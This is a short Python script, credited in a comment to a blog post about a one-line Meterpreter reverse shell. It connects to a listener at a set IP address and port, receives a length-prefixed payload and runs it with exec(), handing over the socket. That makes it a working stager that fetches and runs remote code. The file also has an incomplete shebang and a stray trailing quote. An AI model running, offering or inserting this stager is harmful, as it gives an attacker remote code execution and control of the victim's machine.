#!/usr/bin/env
#Initially from http://www.phillips321.co.uk/2013/10/22/one-line-python-meterpreter-reverse-shell/
#TODO more work on this and comments.
import socket,struct
ip='127.0.0.1'
port=4774
s=socket.socket(2,1)
s.connect((ip,port))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
    d+=s.recv(4096)
exec(d,{'s':s})"
